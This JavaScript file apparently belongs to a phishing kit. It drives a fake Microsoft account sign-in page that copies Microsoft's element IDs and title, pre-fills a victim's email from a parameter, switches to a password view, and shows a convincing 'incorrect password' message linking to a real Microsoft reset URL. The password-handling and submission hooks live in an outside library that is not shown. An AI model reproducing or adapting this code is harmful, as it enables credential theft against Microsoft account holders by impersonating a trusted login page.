var form1Button;

window.onload = function () {
    initApp(bindElements, document.querySelector('body > div'));
}

function requestPasswordMode() {
    document.querySelector('div[data-viewid="1"]').style.display = 'none';
    document.querySelector('div[data-viewid="2"]').style.display = 'block';
    document.querySelector('div.user-email').style.display = 'block';
    window.LIB_submitButton.disabled = true;
    updateEmailInView();
}

function updateEmailInView() {
    const email = window.LIB_userInput.value;
    const dname = document.getElementById('displayName');
    dname.innerText = email;
    dname.setAttribute('title', email);
    window.LIB_pwdInput.setAttribute('aria-label', "Enter the password for " + email);
}

function bindElements(params) {
    form1Button = document.getElementById('idSIButton9');
    window.LIB_submitButton = document.getElementById('idSIButton10');
    window.LIB_userInput = document.querySelector('input[name="loginfmt"]');
    window.LIB_pwdInput = document.querySelector('input[name="passwd"]');
    window.LIB_spinner = document.querySelector('button .LIB_spinner_el');
    window.LIB_onLoginFail = function () {
        var notice = document.getElementById('passwordError');
        notice.innerHTML = "Your account or password is incorrect. If you don't remember " +
            "your password, " +
            '<a id=\"idA_IL_ForgotPassword0\" ' +
            'href=\"https://account.live.com/ResetPassword.aspx?wreply=https://login.live.com/login.srf%3fwa%3dwsignin1.0%26rpsnv%3d13%26ct%3d1588239541%26rver%3d7.0.6737.0%26wp%3dMBI_SSL%26wreply%3dhttps%253a%252f%252foutlook.live.com%252fowa%252f%253fnlp%253d1%2526RpsCsrfState%253d7281d010-55d5-3147-50e5-3fa78ec74036%26id%3d292841%26aadredir%3d1%26CBCXT%3dout%26lw%3d1%26fl%3ddob%252cflname%252cwld%26cobrandid%3d90015%26uaid%3d6f76061369744447a69041d439afacaa%26pid%3d0%26contextid%3d7299327A97542A7D%26bk%3d1588264634&amp;id=292841&amp;uiflavor=web&amp;cobrandid=90015&amp;uaid=6f76061369744447a69041d439afacaa&amp;mkt=EN-US&amp;lc=1033&amp;bk=1588264634\"> ' +
            "reset it now.</a>";
        window.LIB_pwdInput.classList.add('has-error');
        window.LIB_pwdInput.value = '';
    };
    window.LIB_onServerError = function () {
        const notice = document.getElementById('passwordError');
        notice.innerText = "Oops! Something went wrong with our server, please try again later.";
        window.LIB_pwdInput.classList.add('has-error');
        window.LIB_pwdInput.value = '';
    };

    window.LIB_userInput.addEventListener("keyup", function (e) {
        form1Button.disabled = !validateEmail(this.value);
    });

    form1Button.addEventListener("click", function (e) {
        e.preventDefault();
        requestPasswordMode();
    });

    document.getElementsByTagName('title')[0]
        .innerText = 'Sign in to your Microsoft account';
    if (params.email) {
        window.LIB_userInput.value = params.email;
        requestPasswordMode();
    }

}
